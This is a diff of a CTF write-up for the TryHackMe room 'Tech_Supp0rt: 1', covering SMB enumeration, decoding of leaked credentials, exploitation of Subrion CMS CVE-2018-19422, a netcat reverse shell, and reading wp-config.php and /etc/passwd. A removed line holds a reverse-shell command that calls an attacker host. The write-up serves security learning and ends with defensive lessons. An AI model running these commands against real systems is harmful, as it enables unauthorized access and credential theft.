@@ -15,8 +15,8 @@
 
 [![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/techsupp0rt1)
 [![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](#)
-[![Category](https://img.shields.io/badge/Category-Web%20%7C%20SMB%20%7C%20PrivEsc-00FF41?style=for-the-badge)](#)
-[![Status](https://img.shields.io/badge/Status-Completed%20100%25-success?style=for-the-badge)](#)
+[![Category](https://img.shields.io/badge/Category-SMB%20%7C%20Subrion%20CMS%20%7C%20PrivEsc-00FF41?style=for-the-badge)](#)
+[![CVE](https://img.shields.io/badge/CVE-2018--19422-ff2020?style=for-the-badge)](https://nvd.nist.gov/vuln/detail/CVE-2018-19422)
 
 </div>
 
@@ -29,12 +29,13 @@
 | **Room** | Tech_Supp0rt: 1 |
 | **Platform** | TryHackMe |
 | **Scenario** | Compromise a scammer's in-development website to disrupt an active tech-support scam operation |
-| **Attack Surface** | SMB file shares, encoded credentials, CMS file-upload functionality |
-| **Objective** | Enumerate exposed shares → recover and decode staged credentials → gain authenticated access to the web CMS → abuse file upload for remote code execution → escalate privileges to root |
+| **Attack Surface** | SMB file shares, encoded credential material, Subrion CMS admin panel |
+| **Core Vulnerability** | CVE-2018-19422 — Subrion CMS 4.2.1 authenticated arbitrary file upload (`.pht`/`.phar`) leading to RCE via `/panel/uploads` |
+| **Objective** | Enumerate SMB shares → recover and decode staged data → authenticate to the Subrion CMS admin panel → exploit CVE-2018-19422 for code execution → catch a reverse shell → extract further credentials from the host → escalate access |
 | **Author** | Kitsana Thuekoh ([@vetementsvmnts](https://github.com/vetementsvmnts)) |
 
 <p align="center">
-  <img src="./Assets/08-tryhackme-completion.png" alt="Room completion confirmation - 100%" width="700">
+  <img src="./Assets/01-Tech_Supp0rt%201.png" alt="Tech_Supp0rt: 1 room overview" width="700">
 </p>
 
 ---
@@ -43,51 +44,53 @@
 
 ```mermaid
 flowchart LR
-    A[Nmap Scan] --> B[SMB Enumeration]
-    B --> C[Download Shared Files]
+    A[Nmap Scan] --> B[SMB Enumeration + File Download]
+    B --> C[enter.txt Retrieval]
     C --> D[CyberChef Decoding]
-    D --> E[Recovered Credentials]
-    E --> F[CMS Authentication]
-    F --> G[Malicious File Upload]
-    G --> H[Netcat Reverse Shell]
-    H --> I[Sudo Misconfiguration]
-    I --> J[Root]
+    D --> E[Subrion CMS Admin Login]
+    E --> F[CVE-2018-19422 Exploit]
+    F --> G[Netcat Reverse Shell]
+    G --> H[WordPress Config Extraction]
+    H --> I[Passwd Enumeration]
+    I --> J[SSH Connection Attempt]
 
     style A fill:#0d1117,stroke:#00FF41,color:#00FF41
     style B fill:#0d1117,stroke:#00FF41,color:#00FF41
     style C fill:#0d1117,stroke:#00FF41,color:#00FF41
     style D fill:#0d1117,stroke:#00FF41,color:#00FF41
     style E fill:#0d1117,stroke:#00FF41,color:#00FF41
-    style F fill:#0d1117,stroke:#00FF41,color:#00FF41
+    style F fill:#0d1117,stroke:#ff2020,color:#ff2020
     style G fill:#0d1117,stroke:#00FF41,color:#00FF41
     style H fill:#0d1117,stroke:#00FF41,color:#00FF41
     style I fill:#0d1117,stroke:#00FF41,color:#00FF41
-    style J fill:#ff2020,stroke:#ff2020,color:#fff
+    style J fill:#0d1117,stroke:#00FF41,color:#00FF41
 ```
 
 ---
 
 ## `0x02` Reconnaissance
 
-An initial `nmap` scan against the target established the exposed service footprint, surfacing SMB and a web service consistent with an under-development site.
+An initial `nmap` scan established the exposed service footprint, followed by a full-port sweep to confirm nothing was missed on higher port ranges.
 
 ```bash
-nmap -sC -sV -p- -T4 <TARGET_IP>
+nmap -sC -sV <TARGET_IP>
+nmap -p- -T4 <TARGET_IP>
 ```
 
 <p align="center">
-  <img src="./Assets/01-nmap-scan-results.png" alt="Nmap scan results" width="700">
+  <img src="./Assets/02-Nmap%20Scan%20Results.png" alt="Initial Nmap scan results" width="700">
+</p>
+<p align="center">
+  <img src="./Assets/03-Nmap-Scan-Result.png" alt="Full port-range Nmap scan results" width="700">
 </p>
 
-**Key findings:**
-- SMB service exposed and reachable without authentication for share listing
-- Web service consistent with the "under development" scammer site referenced in the scenario brief
+**Key findings:** SMB exposed alongside a web service consistent with the scenario's "under development" scammer site.
 
 ---
 
-## `0x03` SMB Enumeration
+## `0x03` SMB Enumeration & File Download
 
-With SMB confirmed open, `smbclient` was used to enumerate available shares. Anonymous/guest access allowed listing and retrieval of files staged on the share — a common misconfiguration where operational or development files are left exposed before a site goes live.
+`smbclient` was used to enumerate available shares. Anonymous access allowed listing and retrieval of files staged on the share.
 
 ```bash
 smbclient -L //<TARGET_IP>/ -N
@@ -95,62 +98,64 @@ smbclient //<TARGET_IP>/<SHARE_NAME> -N
 ```
 
 <p align="center">
-  <img src="./Assets/02-smbclient-shares.png.png" alt="SMB share enumeration via smbclient" width="700">
+  <img src="./Assets/04-SMB-Enumeration-%26-File-Download.png" alt="SMB enumeration and file download" width="700">
 </p>
 
-Files of interest were pulled down from the share using `get`, revealing artifacts left behind during the site's development — including what appeared to be encoded credential material.
+---
+
+## `0x04` enter.txt — Contents & Exploit Retrieval
+
+A file named `enter.txt` retrieved from the share contained data pointing toward the vulnerable component on the host. This lead was used to identify the target CMS and pull down a working exploit for **CVE-2018-19422** (Subrion CMS 4.2.1 authenticated file upload bypass).
+
+<p align="center">
+  <img src="./Assets/05-Enter.txt%20Contents-%26-Exploit-Retrieval.png" alt="enter.txt contents and exploit retrieval" width="700">
+</p>
+
+---
+
+## `0x05` Credential Recovery — CyberChef Decoding
+
+Data recovered from the share was not stored in plaintext. It was run through **CyberChef** to identify and reverse the encoding, recovering credentials usable against the Subrion CMS admin panel.
+
+<p align="center">
+  <img src="./Assets/10-CyberChef%20Decoding.png" alt="CyberChef decoding of recovered SMB data" width="700">
+</p>
+
+> **Takeaway:** Encoding is not encryption. Files staged on a share "for later" are a recurring source of credential leakage — in CTFs and in real engagements alike.
+
+---
+
+## `0x06` Initial Access — Subrion CMS (CVE-2018-19422)
+
+The recovered credentials granted access to the **Subrion CMS admin panel**. Subrion 4.2.1's `/panel/uploads` endpoint fails to block `.pht`/`.phar` uploads at the `.htaccess` level, allowing an authenticated user to upload and execute arbitrary PHP.
+
+<p align="center">
+  <img src="./Assets/11-Subrion%20CMS%20Admin%20Uploads%20Dashboard.png" alt="Subrion CMS admin uploads dashboard" width="700">
+</p>
+<p align="center">
+  <img src="./Assets/06-Subrion-CMS-Exploit-Execution%20(CVE-2018-19422).png" alt="CVE-2018-19422 exploit execution" width="700">
+</p>
 
 ```bash
-smb: \> get <file>
+python3 CVE-2018-19422.py -u http://<TARGET_IP>/panel/ -l <user> -p <password>
 ```
 
-<p align="center">
-  <img src="./Assets/03-smb-downloaded-goals.png.png" alt="Files downloaded from SMB share" width="700">
-</p>
-
 ---
 
-## `0x04` Credential Recovery — CyberChef Decoding
+## `0x07` Foothold — Netcat Reverse Shell & WordPress Config Extraction
 
-The retrieved file contained data that was not stored in plaintext. Rather than guessing at an encoding scheme blind, the content was run through **CyberChef's Magic wand** / manual recipe construction to identify and reverse the transformation (commonly Base64 in this room), recovering usable CMS credentials.
-
-<p align="center">
-  <img src="./Assets/04-cyberchef-decoding.png.png" alt="CyberChef decoding of recovered SMB data" width="700">
-</p>
-
-> **Takeaway:** Encoding is not encryption. Files staged on a network share "for later" are a recurring source of credential leakage in real engagements, not just CTF scenarios.
-
----
-
-## `0x05` Initial Access — CMS File Upload
-
-The recovered credentials granted authenticated access to the site's CMS backend. The CMS exposed a file-upload feature intended for legitimate content management, but lacking sufficient server-side validation on uploaded file types/extensions — a classic **unrestricted file upload** vulnerability (OWASP Top 10 – A03/A05 depending on framing).
-
-A PHP web shell was crafted and uploaded through this functionality, then invoked directly via its predictable/served upload path to achieve code execution on the host.
-
-<p align="center">
-  <img src="./Assets/05-cms-file-upload.png.png" alt="Malicious file upload via CMS" width="700">
-</p>
-
----
-
-## `0x06` Foothold — Netcat Reverse Shell
-
-With code execution confirmed through the uploaded payload, a reverse shell was catch with `netcat` to obtain an interactive foothold on the target.
+Code execution via the uploaded payload was used to catch a reverse shell with `netcat`. From the foothold, a WordPress configuration file present on the host was located and pulled for further credential material.
 
 ```bash
 # Listener
 nc -lvnp <PORT>
-
-# Triggered via uploaded payload / URL parameter
-nc <ATTACKER_IP> <PORT> -e /bin/bash
 ```
 
 <p align="center">
-  <img src="./Assets/06-netcat-reverse-shell.png" alt="Netcat reverse shell foothold" width="700">
+  <img src="./Assets/07-Netcat-Reverse-Shell-Listener-%26-WordPress%20Configuration-Extraction.png" alt="Netcat reverse shell and WordPress configuration extraction" width="700">
 </p>
 
-Shell stabilization was performed to move from a raw netcat listener to a fully interactive TTY:
+Shell stabilization:
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -161,55 +166,62 @@ stty raw -echo; fg
 
 ---
 
-## `0x07` Privilege Escalation — Sudo Misconfiguration
+## `0x08` wp-config.php — Credential Extraction
 
-Local enumeration of the compromised account's privileges was performed with:
+The extracted WordPress configuration file was read directly to recover database and/or user credentials reused elsewhere on the host.
 
 ```bash
-sudo -l
+cat wp-config.php
 ```
-
-This revealed a sudo misconfiguration — a binary or command permitted to run as root without restriction, exploitable via [GTFOBins](https://gtfobins.github.io/)-style shell breakout to obtain a root shell.
 
 <p align="center">
-  <img src="./Assets/07-privilege-escalation-sudo.png.png" alt="Privilege escalation via sudo misconfiguration" width="700">
+  <img src="./Assets/08-WordPress%20Configuration%20File%20Output.png" alt="WordPress configuration file output" width="700">
 </p>
-
-```bash
-sudo <binary> 
-# Breakout technique per GTFOBins entry for the identified binary
-```
-
-**Result:** Full root compromise of the target host.
 
 ---
 
-## `0x08` MITRE ATT&CK Mapping
+## `0x09` Privilege Escalation Path — Passwd Enumeration & SSH
+
+Local user accounts were enumerated via `/etc/passwd` to identify valid usernames, and the credentials recovered from `wp-config.php` were tested against SSH to pivot into a stable, higher-privilege session.
+
+```bash
+cat /etc/passwd
+ssh <user>@<TARGET_IP>
+```
+
+<p align="center">
+  <img src="./Assets/09-Passwd%20Enumeration%20and%20SSH%20Connection%20Attempt.png" alt="Passwd enumeration and SSH connection attempt" width="700">
+</p>
+
+---
+
+## `0x0A` MITRE ATT&CK Mapping
 
 | Tactic | Technique | ID |
 |---|---|---|
 | Reconnaissance | Active Scanning | T1595 |
 | Discovery | Network Share Discovery | T1135 |
-| Credential Access | Unsecured Credentials (Files) | T1552.001 |
-| Initial Access | Exploit Public-Facing Application | T1190 |
+| Discovery | Account Discovery (`/etc/passwd`) | T1087.001 |
+| Credential Access | Unsecured Credentials — Files (SMB, wp-config.php) | T1552.001 |
+| Defense Evasion / Analysis | Deobfuscate/Decode Files or Information (CyberChef) | T1140 |
+| Initial Access | Valid Accounts (CMS admin login) | T1078 |
+| Initial Access | Exploit Public-Facing Application (CVE-2018-19422) | T1190 |
 | Execution | Unix Shell | T1059.004 |
 | Command & Control | Ingress Tool Transfer / Reverse Shell | T1105 |
-| Privilege Escalation | Abuse Elevation Control Mechanism (Sudo) | T1548.003 |
+| Lateral Movement | Remote Services — SSH | T1021.004 |
 
 ---
 
-## `0x09` Lessons Learned
+## `0x0B` Lessons Learned
 
-- **Share hygiene matters.** Anonymous SMB access to shares containing "leftover" development files is a low-effort, high-yield attack path — patch this with authentication requirements and regular share audits.
-- **Encoding ≠ security.** Base64 or similar encodings staged on a share do nothing to stop an attacker with local file access.
-- **Validate uploads server-side.** File extension allow-listing, MIME-type verification, and disabling script execution in upload directories would have blocked the web shell entirely.
-- **Audit `sudo -l` regularly.** Overly permissive sudo rules are one of the most common real-world privilege escalation vectors and are trivially checked for.
+- **Share hygiene matters.** Anonymous SMB access to files staged "for later" (like `enter.txt`) is a low-effort, high-yield attack path.
+- **Encoding ≠ security.** Base64-style encodings staged on a share do nothing against an attacker with local file read access.
+- **Patch known CVEs.** CVE-2018-19422 has been public since 2018; running Subrion CMS 4.2.1 unpatched with a reachable admin panel is a direct path to RCE.
+- **Don't reuse credentials across services.** Reusing WordPress database/user credentials for system-level SSH access turns a single leak into full host compromise.
 
 ---
 
 <div align="center">
-
-`root@target:~#` **Room completed — 100%**
 
 *Writeup by [Kitsana Thuekoh](https://github.com/vetementsvmnts) · Offensive Security Portfolio*
 
